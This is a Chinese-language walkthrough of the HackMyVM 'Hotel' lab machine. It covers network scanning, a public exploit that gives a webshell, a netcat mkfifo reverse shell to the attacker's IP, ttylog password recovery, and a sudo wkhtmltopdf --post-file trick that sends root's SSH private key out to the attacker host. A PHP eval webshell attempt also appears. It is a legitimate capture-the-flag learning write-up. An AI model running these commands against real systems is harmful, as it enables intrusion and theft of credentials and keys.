---
title: "penetration | 01_hackmyvm-easy-Hotel"
description: "一次渗透测试复现实践"
date: "2022-03-29T12:29:00.000Z"
updated: "2024-03-01T05:18:07.000Z"
tags: ["penetration"]
draft: false
layout: "post"
slug: "hackmyvm-easy-hotel"
---

## HackMyVM | Easy - Hotel

## 敬告

**1，本人文章所有内容仅用于个人学习、研究或者欣赏使用，请读者（以下简称“您”）不要从事任何非法行为。**

**2，本人文章中涉及到的转载，摘录等内容均会标明清楚来源，如涉及侵权，请联系本人删除。**

**3，请您支持正版软件，切勿使用盗版软件，非官方网站的网络资源请在试用后24小时内删除。**

**4，本次实践环境来自网上已公开的渗透测试环境虚拟机，一切操作过程涉及到的操作网路皆仅由本人自用路由器搭建而成，不涉及到任何人或组织的利益相关。由因您从事各种违反网络安全法等相关法律法规而产生的任何问题都将由您自行承担。**

## 实践环境

### 攻击机

kali - VirtualBox_amd64 | 192.168.6.188

ubuntu - Desktop_amd64 | 192.168.6.223

Windows 10 | 192.168.6.107

### 靶机

[Hotel - Debian 10 from HackMyVM.eu](https://hackmyvm.eu/machines/machine.php?vm=Hotel) | 192.168.6.234

开机 如图所示

![image-20220326092250732](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220326092250732.png)

## 前期测探

于是就围绕 **192.168.6.234** 这个地址来操作

### 一，最优解是netdiscover

```bash
# -r 指定范围 -i 指定网卡
netdiscover -r 192.168.6.0/24 -i eth0
```

扫描结果如下

![image-20220326161329189](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220326161329189.png)

确定了目标靶机的ip以后 使用nmap查看有什么服务

```bash
## -sC 默认脚本
## -sV 探测打开的端口以确定服务/版本信息
## -v 显示详细信息
nmap -sC -sV -p- 192.168.6.234 -v
```

![image-20220326162101971](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220326162101971.png)

#### 二，考虑用 kali 上的 nmap 来扫描

```bash
# 查看 kali 网段信息
ifconfig
> inet 192.168.6.188  netmask 255.255.255.0  broadcast 192.168.6.255

# 扫描网段

## -sP 进行ping扫描
## 打印出对ping扫描做出响应的主机,不做进一步测试(如端口扫描或者操作系统探测)：

## -v 显示详细过程

## grep 高亮或取出 指定的内容
## -B -A 向前/向后 多少行
nmap -v -sP 192.168.6.0/24 | grep "Host is up" -B 1 -A 1
```

扫描结果如下

![image-20220326094342051](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220326094342051.png)

---

开放了 80 端口 可以直接访问

![image-20220326094459807](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220326094459807.png)

走一圈看看

### 扫描子域名

使用 gobuster

```bash
## -u 指定url
## -w 指定爆破的词库
## -x 指定要搜索的拓展名
gobuster dir -u http://192.168.6.234/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php
```

![image-20220326163712580](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220326163712580.png)

访问 **index.html** 自动跳初始化设定 先跳过

访问 **README** 会404

- 这里用**wget http://192.168.6.234/README** 可以把文件下载到本地查看
- 根据**README** 文件 我们可以**wget http://192.168.6.234/doc/README.english** 获得可读文件一个

### 利用公开的exp

从文章中得到整个框架的版本号

然后 去网上搜一下 有没有已经公开过的 [exp](https://www.exploit-db.com/exploits/50754)

![image-20220326165133907](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220326165133907.png)![image-20220326165746600](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220326165746600.png)

~~exp到这里还有什么事情吗~~

跑一下exp看看 这里要根据人exp的设定来使用

![image-20220326171026367](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220326171026367.png)

### webshell

看回显信息，获得的webshell地址在 **/dati/selectappartamenti.php** ![image-20220328171647310](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220328171647310.png)

访问后就可以看到信息了

到这里成功获取了webshell(www-data)

![image-20220328172142773](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220328172142773.png)

接下来是进入到内网渗透

## 进入物理机

对获取到的**websehll**使用**burpsuite**截取数据包处理

右键发送到重发器

![image-20220329114406064](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329114406064.png)

利用 pentest monkey 上的nc弹shell指令

![image-20220329114800373](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329114800373.png)

先在kali上监听相应端口

![image-20220329120025697](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329120025697.png)

弹shell指令

**rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.6.188 233 >/tmp/f**

![image-20220329115016514](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329115016514.png)

然后点击 send 就能弹shell了

![image-20220329120109569](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329120109569.png)

### 查找可利用的点

```bash
# 查看用户
cd /home/xxx
cat xxx
cd ~
ls -al

# /var 查看backups
cd /var/backups
cd /html
```

找到一个可以利用的 ttylog

![image-20220329121418570](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329121418570.png)

![image-20220329122119090](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329122119090.png)

传到本机上

方法1：

> ubuntu：
> 
> ```
> 先安装 ttyplay
> ```
> 
> ```
> sudo apt install ttyrec
> ```
> 
> ```
> 监听nc传来的文件(注意检查放开的端口有没有被占用或者被防火墙ban)
> ```
> 
> ```
> nc -l 1234 > ttylog
> ```
> 
> 靶机：
> 
> ```
> 用nc发送文件
> ```
> 
> ```
> nc 192.168.6.234 1234 < ttylog
> ```

方法2：

> 靶机：
> 
> ```
> python3 -m http.server port
> ```
> 
> 攻击机：
> 
> ```
> wget http://192.168.6.234:port/ttylog
> ```

然后在ubuntu上播放这条ttylog

![image-20220329122339533](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329122339533.png)

取得密码 **Endur4nc3.**

使用ssh连接靶机

![image-20220329123036284](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329123036284.png)

下一步是提权

### 提权

使用 **sudo -l** 查看当前用户可以使用的命令

```bash
sudo --help
## -l, --list	列出用户权限或检查某个特定命令；对于长格式，使用两次
```

![image-20220329125655011](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329125655011.png)

上网查一下这个 wkhtmltopdf 的具体使用内容

![image-20220329194031131](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329194031131.png)

用 **--post-file \&lt;filename&gt; \&lt;filepath&gt; 2where newpdf**

> 靶机：
> 
> ```
> sudo -u root wkhtmltopdf --post-file 'giveyouflag' /root/.ssh/rsa_id http://192.168.6.188:1234 a.pdf
> ```
> 
> ```
> 
> ```
> 
> \## 用 sudo -u 来指定 root
> 
> ```
> 
> ```
> 
> \## 用--post-file 来上传密钥给攻击机
> 
> 攻击机：
> 
> ```
> nc -nvlp 1234
> ```

![image-20220329195538782](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329195538782.png)

获得了私钥 就可以利用私钥连接了

```bash
cd ~/.ssh
touch id_rsa
vim id_rsa
## 复制和粘贴私钥 保存

ssh root@192.168.6.234
## 免密登录
```

![image-20220329200630057](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220329200630057.png)

## 其他内容

这里放不能成功操作的内容

### 文件上传

```
找到一个可以文件上传的点，而且可以访问这个上传的点，
```

```
但是限定了 .html .txt .rtx 上传后会改名
```

![](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220326124748057.png)

```
尝试写 shell.php
```

```php
<?php @eval(phpinfo());?>
```

```
尝试上传，发现上传的文件在
```

**/dati/Invoice_2022_00001.html** 可以被访问到 但是被修改了后缀，也就断绝了一句话文件上传的可能了。

## 参考链接

1，[反向shell备忘单|Reverse Shell Cheat Sheet](https://www.ddosi.org/reverse-shell/)

2，[狼组安全团队公开知识库](https://wiki.wgpsec.org/)

3，[WebShell①一句话木马](https://www.kitsch.live/2020/12/25/文件上传①一句话木马)

4，[挂马方法大全](https://codeantenna.com/a/7vQ2h716ae)

5，[HackMyVm - Hotel](https://www.youtube.com/watch?v=3GAcO5IBNn8)

6，[Gobuster - 子域名挖掘的新操作](https://zhuanlan.zhihu.com/p/33999581)

7，[exploit-db](https://www.exploit-db.com/)

8，[pentest monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

9，[wkhtmltopdf 命令使用方法](http://www.iamlintao.com/6292.html)

10，
